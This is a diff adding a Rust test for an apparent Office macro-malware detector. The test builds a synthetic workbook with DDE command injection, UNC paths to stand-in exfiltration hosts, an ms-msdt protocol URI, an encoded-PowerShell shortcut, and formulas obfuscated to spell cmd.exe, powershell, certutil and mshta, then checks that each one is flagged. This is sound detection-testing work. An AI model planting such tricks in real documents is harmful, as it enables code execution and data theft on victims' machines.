@@ -6875,3 +6875,190 @@ fn e2e_powerpoint_props_threaded_comments_theme_and_financial_math_inspection() 
         "JSON missing VBA-CELL-076"
     );
 }
+
+#[test]
+fn e2e_powerpoint_sync_word_keymap_webpublish_and_irr_mirr_inspection() {
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/ppt/commentAuthors.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.commentAuthors+xml"/>
+  <Override PartName="/word/keyMap.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.keyMap+xml"/>
+  <Override PartName="/xl/webPublishing.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.webPublishing+xml"/>
+</Types>"#;
+
+    let package_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    // Formulas using RECEIVED, PRICEDISC, MIRR, DISC resolving to cmd.exe, powershell, certutil, mshta
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="str">
+        <f>CHAR(RECEIVED(1, 91, 96.525, 0.10, 2)) &amp; &quot;md.exe&quot;</f>
+      </c>
+      <c r="B1" t="str">
+        <f>CHAR(PRICEDISC(1, 91, 0.10, 100, 2) + 14.5) &amp; &quot;owershell&quot;</f>
+      </c>
+      <c r="C1" t="str">
+        <f>CHAR(MIRR({-100, 110}, 0.1, 0.1) * 990) &amp; &quot;ertutil&quot;</f>
+      </c>
+      <c r="D1" t="str">
+        <f>CHAR(DISC(1, 91, 97.5, 100, 2) * 1090) &amp; &quot;shta&quot;</f>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    // 1. PowerPoint comment authors with cloaked DDE formula and remote UNC mention (VBA-CELL-077)
+    let ppt_comment_authors_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:cmAuthorLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:cmAuthor id="0" name="cmd|'/c calc'!A1" initials="AD" lastIdx="1" clrIdx="0"/>
+  <p:cmAuthor id="1" name="ExfilUser" initials="EU" lastIdx="1" clrIdx="1">
+    <p:extLst>
+      <p:ext uri="\\malicious-sync-server\harvest\authors"/>
+    </p:extLst>
+  </p:cmAuthor>
+</p:cmAuthorLst>"#;
+
+    // 2. Word keymap with macro shortcut execution hook and staged shell command (VBA-CELL-078)
+    let word_keymap_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:keyMap xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:fkeyShortcut w:kcm="1024" w:macro="AutoOpen_Payload_Execute"/>
+  <w:shortcut w:cmd="powershell.exe -enc AAAA"/>
+</w:keyMap>"#;
+
+    // 3. Excel web publishing with remote UNC destination and dangerous exploit URI (VBA-CELL-079)
+    let xl_web_publishing_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<webPublishing xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+  target="\\silent-exfil-host\share\leaked_financials.html"
+  source="ms-msdt:/id PCWDiagnostic"/>"#;
+
+    let cfb = synthesize_cfb("VBAProject", "Module1", "Sub Test()\nEnd Sub\n", &[]);
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", package_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("ppt/commentAuthors.xml", ppt_comment_authors_xml.as_bytes()),
+        ("word/keyMap.xml", word_keymap_xml.as_bytes()),
+        ("xl/webPublishing.xml", xl_web_publishing_xml.as_bytes()),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify PowerPoint Sync or Comment Authors threats (VBA-CELL-077)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerPointSyncOrCommentAuthorsAnomaly"
+                && (t.coordinate.contains("powerpointSync:uncCoercion")
+                    || t.coordinate.contains("powerpointSync:cloakedDde"))),
+        "Should detect PowerPointSyncOrCommentAuthorsAnomaly (VBA-CELL-077): {threats:?}"
+    );
+
+    // 2. Verify Word KeyMap or Customization threats (VBA-CELL-078)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "WordKeyMapOrCustomizationAnomaly"
+                && (t.coordinate.contains("wordKeyMap:macroHook")
+                    || t.coordinate.contains("wordKeyMap:stagedCommand"))),
+        "Should detect WordKeyMapOrCustomizationAnomaly (VBA-CELL-078): {threats:?}"
+    );
+
+    // 3. Verify Excel Web Publishing threats (VBA-CELL-079)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExcelWebPublishingOrSparklineAnomaly"
+                && (t.coordinate.contains("excelWebPublish:uncCoercion")
+                    || t.coordinate.contains("excelWebPublish:dangerousProtocol"))),
+        "Should detect ExcelWebPublishingOrSparklineAnomaly (VBA-CELL-079): {threats:?}"
+    );
+
+    // 4. Verify dynamic formula de-obfuscation
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("cmd")),
+        "Cell A1 should resolve cmd threat through RECEIVED evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through PRICEDISC evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through MIRR evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell D1 should resolve mshta threat through DISC evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-077, VBA-CELL-078, VBA-CELL-079
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/ppt_sync_word_keymap_webpublish.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-077"),
+        "SARIF must contain VBA-CELL-077 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-078"),
+        "SARIF must contain VBA-CELL-078 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-079"),
+        "SARIF must contain VBA-CELL-079 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-077, VBA-CELL-078, VBA-CELL-079
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-077\""),
+        "JSON missing VBA-CELL-077"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-078\""),
+        "JSON missing VBA-CELL-078"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-079\""),
+        "JSON missing VBA-CELL-079"
+    );
+}
